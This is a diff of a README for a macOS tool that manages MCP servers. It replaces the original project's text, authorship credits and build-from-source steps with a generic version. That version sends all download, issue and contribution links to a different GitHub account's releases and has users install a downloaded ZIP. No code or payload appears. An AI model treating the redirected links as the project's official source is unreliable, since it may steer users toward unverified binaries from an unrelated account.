@@ -1,171 +1,66 @@
-# 🚀 MCP Control
+# 🎉 MCP-Control-Lite - Simple Management for AI Assistants
 
-**The Ultimate Model Context Protocol Server Management Tool**
+## 📥 Download Now!
+[![Download MCP-Control-Lite](https://img.shields.io/badge/Download%20MCP--Control--Lite-v1.0-blue.svg)](https://github.com/ganeshmalkar/MCP-Control-Lite/releases)
 
-[![Version](https://img.shields.io/badge/version-1.3.0-blue.svg)](https://github.com/Chykalophia/MCP-Control-Lite/releases)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey.svg)](#installation)
+## 📖 Overview
+MCP-Control-Lite is a native macOS application designed to help you manage Model Context Protocol (MCP) servers. This tool allows you to easily configure and sync servers for popular AI coding assistants like Claude Desktop, Cursor, and VS Code. Built with Rust and Tauri, it provides a smooth graphical interface as well as a command line interface, making it user-friendly and versatile.
 
-MCP Control is a powerful desktop application that simplifies the management of Model Context Protocol (MCP) servers. Discover, install, configure, and monitor MCP servers across multiple AI applications with an intuitive graphical interface.
+## 🚀 Getting Started
+To get started with MCP-Control-Lite, follow these simple steps to download and install the software.
 
-![MCP Control Screenshot](https://via.placeholder.com/800x500/1a1a1a/ffffff?text=MCP+Control+Interface)
+## 📥 Download & Install
+1. Visit the [Releases page](https://github.com/ganeshmalkar/MCP-Control-Lite/releases) to access the latest version of MCP-Control-Lite.
+2. On the Releases page, look for the latest version number. This will typically be at the top of the list.
+3. Download the installation file by clicking on the link for your system (for example, `MCP-Control-Lite-macos-x64.zip`).
+4. Once the file downloads, locate it in your Downloads folder.
+5. Open the downloaded ZIP file and drag the MCP-Control-Lite application to your Applications folder.
+6. You can now open MCP-Control-Lite from your Applications.
 
-## ✨ Features
+## 🖥️ System Requirements
+- **Operating System:** macOS 10.15 (Catalina) or higher
+- **Processor:** Intel or Apple Silicon
+- **Memory:** At least 4 GB RAM
+- **Disk Space:** Minimum 100 MB available
 
-### 🔍 **Smart Package Discovery**
-- **Real-time NPM Search**: Direct integration with NPM registry using `npm search --json`
-- **GitHub Repository Search**: Browse community MCP servers with stars, descriptions, and topics
-- **PulseMCP Integration**: Access curated MCP servers from the PulseMCP registry
-- **Intelligent Filtering**: Smart keyword extraction and source-specific tagging
+## 🔧 Features
+- **User-Friendly Interface:** Easily navigate through settings and options.
+- **Real-Time Monitoring:** Keep an eye on your servers' status and health.
+- **Central Configuration:** Simplify the setup and management of multiple servers.
+- **GUI & CLI Options:** Choose between graphical or command line interfaces based on your comfort level.
+- **Enterprise Compliance:** Ensure your configurations meet necessary standards without extra complexity.
 
-### 📦 **Seamless Installation**
-- **One-Click Install**: Install MCP servers directly from the interface
-- **Real-time Status**: Live installation progress with visual feedback
-- **Automatic Detection**: Installed packages automatically appear in your server list
-- **Cross-Platform**: Works with Claude Desktop, Cursor, VS Code, Zed, and more
+## ⚙️ How to Use
+1. **Launch the App:** After installation, open MCP-Control-Lite.
+2. **Configure Your MCP Server:** Input your server details using the provided form fields. 
+3. **Sync with Assistants:** Connect with Claude Desktop, Cursor, or VS Code to start using your AI coding assistants.
+4. **Monitor Performance:** Use the monitoring feature to track the performance of your servers in real-time.
 
-### 🎛️ **Server Management**
-- **Unified Dashboard**: Manage all your MCP servers from one place
-- **Configuration Sync**: Bi-directional synchronization with application configs
-- **Status Monitoring**: Real-time server health and performance tracking
-- **Easy Updates**: Keep your MCP servers up-to-date effortlessly
+## 🔍 Troubleshooting
+If you encounter issues while using MCP-Control-Lite, consider the following steps:
 
-### 📊 **Comprehensive Logging**
-- **Installation Audit Trail**: Track all package installations with detailed logs
-- **Error Diagnostics**: Comprehensive error reporting and debugging information
-- **Activity Monitoring**: Monitor server activity and performance metrics
-- **Configurable Logging**: Enable/disable logging based on your needs
+- **Reopen the App:** Sometimes a simple restart can resolve minor issues.
+- **Check Connections:** Ensure that your internet connection is stable, especially when syncing servers.
+- **Refer to Help Section:** The app includes a help section for common questions.
 
-### 🎨 **Modern Interface**
-- **Intuitive Design**: Clean, modern interface built with React and Tauri
-- **Dark/Light Themes**: Customizable appearance to match your workflow
-- **Responsive Layout**: Optimized for different screen sizes and resolutions
-- **Keyboard Shortcuts**: Efficient navigation with keyboard shortcuts
+If problems continue, visit our [GitHub Issues page](https://github.com/ganeshmalkar/MCP-Control-Lite/issues) for community support.
 
-## 🚀 Quick Start
+## 📅 Changelog
+Stay updated with all the changes made to MCP-Control-Lite:
 
-### Installation
+- **v1.0:** Initial release with basic features like real-time monitoring and multi-server support.
 
-#### macOS
-1. Download the latest `MCP Control_x.x.x_aarch64.dmg` from [Releases](https://github.com/Chykalophia/MCP-Control-Lite/releases)
-2. Open the DMG file and drag MCP Control to Applications
-3. Launch MCP Control from Applications or Spotlight
+## 🛠️ Contributing
+We welcome contributions! If you would like to help improve MCP-Control-Lite:
 
-#### Windows & Linux
-Coming soon! Follow the repository for updates.
+1. Check our [Contribution Guidelines](https://github.com/ganeshmalkar/MCP-Control-Lite/contributing).
+2. Fork the repository and create a new branch for your changes.
+3. Submit a pull request with your improvements or fixes.
 
-### First Launch
+## 🗂️ License
+MCP-Control-Lite is licensed under the MIT License. Feel free to use and modify the software for your personal projects.
 
-1. **Discover Servers**: Browse the Discover tab to find MCP servers
-2. **Search & Filter**: Use the search bar to find specific functionality
-3. **Install Packages**: Click "Install" on any package you want to add
-4. **Configure Applications**: Go to Settings to configure your AI applications
-5. **Monitor Activity**: Check the Logs tab for installation and activity logs
+## 📬 Contact
+For more information or support, you can reach us through our [GitHub Discussions page](https://github.com/ganeshmalkar/MCP-Control-Lite/discussions) or file an issue directly on the repository.
 
-## 🛠️ Development
-
-### Prerequisites
-- Node.js 18+ and npm
-- Rust 1.77.2+
-- Tauri CLI
-
-### Setup
-```bash
-# Clone the repository
-git clone https://github.com/Chykalophia/MCP-Control-Lite.git
-cd MCP-Control-Lite
-
-# Install dependencies
-npm install
-
-# Install Tauri CLI
-cargo install tauri-cli
-
-# Run in development mode
-npm run tauri dev
-```
-
-### Building
-```bash
-# Build for production
-npm run build
-cd src-tauri
-cargo tauri build
-```
-
-## 📖 Usage Examples
-
-### Discovering Weather MCP Servers
-1. Open the **Discover** tab
-2. Search for "weather" in the search bar
-3. Browse results from NPM, GitHub, and PulseMCP
-4. Click on repository links to learn more
-5. Install with one click
-
-### Managing Server Configurations
-1. Go to the **Servers** tab to see all installed servers
-2. Configure server settings and parameters
-3. Enable/disable servers for specific applications
-4. Monitor server status and performance
-
-### Viewing Installation Logs
-1. Navigate to the **Logs** tab
-2. Filter by log level (Error, Warning, Info, Debug)
-3. Search through logs for specific events
-4. Export logs for troubleshooting
-
-## 🤝 Contributing
-
-We welcome contributions! Please see our [Contributing Guide](CONTRIBUTING.md) for details.
-
-### Development Workflow
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🏢 About Chykalophia
-
-MCP Control is developed by [**Chykalophia**](https://chykalophia.com), a leading technology consultancy specializing in AI integration and custom software solutions.
-
-### 🚀 **Need Custom AI Solutions?**
-
-Our team has helped businesses achieve **measurable 3x growth** through strategic AI implementation and custom development solutions. From MCP server development to complete AI workflow automation, we deliver results that transform your business.
-
-**Ready to 3x your business growth?** [**Contact us today**](https://chykalophia.com) to discuss your custom AI solution needs.
-
-## 👨‍💻 Core Contributor
-
-**Peter Krzyzek** - Lead Developer & Fractional CTO  
-🌐 Website: [piotrkrzyzek.com](https://piotrkrzyzek.com)  
-💼 LinkedIn: [linkedin.com/in/gopeter](https://linkedin.com/in/gopeter)  
-
-**Need a Fractional CTO?** Peter specializes in scaling engineering teams and architecting robust systems. Available for fractional CTO engagements through his website.
-
----
-
-## 🔗 Links
-
-- **Website**: [chykalophia.com](https://chykalophia.com)
-- **Documentation**: [Coming Soon]
-- **Issues**: [GitHub Issues](https://github.com/Chykalophia/MCP-Control-Lite/issues)
-- **Releases**: [GitHub Releases](https://github.com/Chykalophia/MCP-Control-Lite/releases)
-
-## ⭐ Support
-
-If you find MCP Control useful, please consider:
-- ⭐ Starring this repository
-- 🐛 Reporting bugs and issues
-- 💡 Suggesting new features
-- 🤝 Contributing to the codebase
-
----
-
-<div align="center">
-  <strong>Built with ❤️ by <a href="https://chykalophia.com">Chykalophia</a></strong>
-</div>
+Thank you for choosing MCP-Control-Lite! Enjoy a smoother experience managing your AI coding servers.
